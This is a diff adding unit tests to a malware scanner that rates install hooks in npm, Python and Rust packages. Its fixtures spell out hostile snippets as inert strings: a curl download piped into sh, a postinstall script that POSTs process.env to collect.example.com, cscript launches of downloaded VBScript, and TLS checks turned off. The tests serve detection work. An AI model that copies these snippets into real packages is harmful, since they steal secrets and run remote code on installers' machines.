@@ -15,12 +15,14 @@ are followed. The deadline is checked as each module is read.
 Payloads are inert: hosts are .invalid, nothing is extracted or executed.
 """
 import base64
+import json
 import time
 import unittest
 from unittest import mock
 
 from lazaret.registry import repo
-from tests.registry._review_support import issues, scan_sdist, scan_wheel, zipball
+from tests.registry._review_support import (hooks as hook_manifest, issues, manifest, scan_npm, scan_sdist, scan_wheel,
+                                            zipball)
 
 WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
 SETUP = "from setuptools import setup\nsetup(name='x')\n"
@@ -249,6 +251,131 @@ class InstallReachTests(unittest.TestCase):
         res = scan_sdist({"pyproject.toml": pyproject, "_build/backend.py": "import helper\n",
                           "_build/helper.py": BEACON_PY})
         self.assertEqual([(f, sev) for f, sev, _msg in hooks(res)], [("_build/helper.py", "CRITICAL")])
+
+
+class CertificateChecksSeverityTests(unittest.TestCase):
+    """RA-12: a package whose only install/build-time reason is TLS certificate verification turned off is a
+    *weaker* indicator — the SC-INSTALL-HOOK finding is MAJOR and the verdict WARN, not SUSPICIOUS; with a strong
+    reason beside it, it is CRITICAL again. Inert text: hosts are .invalid, nothing runs."""
+
+    def test_npm_hook_cert_off_only_is_major_warn(self):
+        # a postinstall that runs a file which only turns off TLS certificate verification
+        res = scan_npm({"package.json": hook_manifest(postinstall="node setup.js"),
+                        "setup.js": "const https = require('https');\n"
+                                    "https.get({ host: 'x.invalid', rejectUnauthorized: false });\n"})
+        hook = issues(res, "SC-INSTALL-HOOK")
+        self.assertEqual([i["sev"] for i in hook], ["MAJOR"])
+        self.assertIn("turns off TLS certificate verification", hook[0]["msg"])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+
+    def test_npm_hook_cert_off_with_strong_reason_is_critical(self):
+        # cert-off beside a strong reason (a download piped into a shell) is CRITICAL again
+        res = scan_npm({"package.json": hook_manifest(postinstall="node setup.js"),
+                        "setup.js": "const cp = require('child_process');\n"
+                                    "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n"
+                                    "cp.execSync('curl -s https://x.invalid/s | sh');\n"})
+        self.assertEqual([i["sev"] for i in issues(res, "SC-INSTALL-HOOK")], ["CRITICAL"])
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+
+    def test_sdist_setup_cert_off_only_is_major_warn(self):
+        res = scan_sdist({"setup.py": "from setuptools import setup\nimport ssl\n"
+                                      "ssl._create_unverified_context()\nsetup(name='x')\n"})
+        hook = issues(res, "SC-INSTALL-HOOK")
+        self.assertEqual([i["sev"] for i in hook], ["MAJOR"])
+        self.assertIn("turns off TLS certificate verification", hook[0]["msg"])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+
+
+CERT_OFF = "turns off TLS certificate verification"
+WSH = "runs a script with the Windows Script Host"
+DL = "downloads.example.com"
+SENDS_ENV = ("const https = require('https');\n"
+             "https.request({ host: 'collect.example.com', method: 'POST' }).end(JSON.stringify(process.env));\n")
+
+
+class WeakReasonReviewTests(unittest.TestCase):
+    """The review of RA-12 / RA-11 (0298bd6), per finding: cert-off alone is MAJOR with its reason named, cert-off
+    beside a strong reason CRITICAL, and a weaker reason in a hook's command does not stop the follow of the files
+    it runs; the Windows Script Host launcher is matched where it runs (an exec call's program in code, a command's
+    in a batch file read as one), prose is not. Inert text: hosts are example.com or 192.0.2.x, nothing runs."""
+
+    def sev_msg(self, res, rule="SC-INSTALL-HOOK"):
+        return [(i["sev"], i["msg"]) for i in issues(res, rule)]
+
+    def test_a_weak_command_still_follows_the_file_it_runs(self):
+        res = scan_npm({"package.json": hook_manifest(postinstall=f"curl -k https://{DL}/x -o y && node evil.js"),
+                        "evil.js": SENDS_ENV})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "CRITICAL")
+        self.assertTrue(msg.startswith("Install hook runs evil.js, which sends environment variables"), msg)
+
+    def test_a_shell_script_and_a_batch_file_in_their_own_language(self):
+        # the #!/bin/sh script's `https://…` is not a JavaScript comment: its cert-off reason is named, MAJOR
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install"),
+                        "install": f"#!/bin/sh\ncurl -fsSL https://{DL}/x -k -o bin/x\nchmod +x bin/x\n"})
+        self.assertEqual(self.sev_msg(res), [("MAJOR", f"Install hook runs ./install, which {CERT_OFF}.")])
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        # a batch file's `//nologo` is not either: its launch is CRITICAL; its REM and :: lines are not read
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install.cmd"),
+                        "install.cmd": "@echo off\r\nREM curl -k is not used\r\ncscript //nologo setup.vbs\r\n"})
+        self.assertEqual(self.sev_msg(res), [("CRITICAL", f"Install hook runs ./install.cmd, which {WSH} (cscript //nologo setup.vbs).")])
+        res = scan_npm({"package.json": hook_manifest(postinstall="./install.cmd"),
+                        "install.cmd": f"@echo off\r\nREM curl -k https://{DL}/x\r\n:: wget --no-check-certificate\r\necho ok\r\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["MAJOR"])
+        self.assertNotIn(CERT_OFF, self.sev_msg(res)[0][1])
+
+    def test_wsh_launches_where_they_run(self):
+        res = scan_npm({"package.json": hook_manifest(postinstall="node install.js"),
+                        "install.js": "const cp = require('child_process'), path = require('path');\n"
+                                      "if (process.platform === 'win32') cp.exec('cscript ' + path.join(__dirname, 'x.vbs'));\n"})
+        self.assertEqual(self.sev_msg(res),
+                         [("CRITICAL", f"Install hook runs install.js, which {WSH} (cscript + path.join(__dirname, 'x.vbs')).")])
+        res = scan_npm({"package.json": hook_manifest(postinstall="node install.js"),
+                        "install.js": "console.log('On Windows, run cscript setup.vbs to finish');\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["MAJOR"])
+        self.assertNotIn(WSH, self.sev_msg(res)[0][1])
+        res = scan_sdist({"setup.py": "import os, subprocess\nif os.name == 'nt':\n    subprocess.run(['wscript', helper])\n"
+                                      "from setuptools import setup\nsetup(name='x')\n"})
+        self.assertEqual([sev for sev, _m in self.sev_msg(res)], ["CRITICAL"])
+        self.assertIn(f"{WSH} (wscript helper)", self.sev_msg(res)[0][1])
+
+    def test_gyp_action(self):
+        action = lambda argv: {"package.json": manifest().encode(), "binding.gyp": json.dumps(
+            {"targets": [{"target_name": "x", "actions": [{"action_name": "a", "inputs": [], "outputs": ["o"],
+                                                            "action": argv}]}]}).encode()}
+        res = scan_npm(action(["curl", "-k", f"https://{DL}/x", "-o", "o"]))
+        self.assertIn(("MAJOR", f'"binding.gyp action" script {CERT_OFF}.'), self.sev_msg(res))
+        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        res = scan_npm(action(["sh", "-c", f"curl -k https://{DL}/x.vbs -o x.vbs && cscript //nologo x.vbs"]))
+        self.assertIn(("CRITICAL", f'"binding.gyp action" script {WSH} (cscript //nologo x.vbs); and {CERT_OFF}.'),
+                      self.sev_msg(res))
+
+    def test_start_up_module(self):
+        meta = {"x-1.0.dist-info/METADATA": "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n",
+                "x-1.0.dist-info/RECORD": ""}
+        res = scan_wheel(dict(meta, **{"sitecustomize.py": f"import requests\nrequests.get('https://{DL}/x', verify=False)\n"}))
+        [(sev, msg)] = self.sev_msg(res, "SC-SITECUSTOMIZE")
+        self.assertEqual(sev, "MAJOR")
+        self.assertTrue(msg.endswith(f"and it {CERT_OFF}."), msg)
+        res = scan_wheel(dict(meta, **{"sitecustomize.py": "import ssl, subprocess\n"
+                                                           "ssl._create_default_https_context = ssl._create_unverified_context\n"
+                                                           "subprocess.run(['wscript', 'x.vbs'])\n"}))
+        self.assertEqual([sev for sev, _m in self.sev_msg(res, "SC-SITECUSTOMIZE")], ["CRITICAL"])
+
+    def test_build_script(self):
+        from tests.registry.test_lookalike import scan_crate
+        cargo = '[package]\nname = "x"\nversion = "1.0.0"\nbuild = "build.rs"\n'
+        client = (f'let c = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap(); '
+                  f'let _ = c.get("https://{DL}/p").send();')
+        res = scan_crate({"Cargo.toml": cargo, "src/lib.rs": "pub fn f() {}\n", "build.rs": f"fn main() {{ {client} }}\n"})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "MAJOR")
+        self.assertTrue(msg.endswith(f"and it {CERT_OFF}."), msg)
+        res = scan_crate({"Cargo.toml": cargo, "src/lib.rs": "pub fn f() {}\n",
+                          "build.rs": f'fn main() {{ {client} std::process::Command::new("cscript").arg("x.vbs").status().unwrap(); }}\n'})
+        [(sev, msg)] = self.sev_msg(res)
+        self.assertEqual(sev, "CRITICAL")
+        self.assertIn(f"{WSH} (cscript x.vbs)", msg)
 
 
 if __name__ == "__main__":
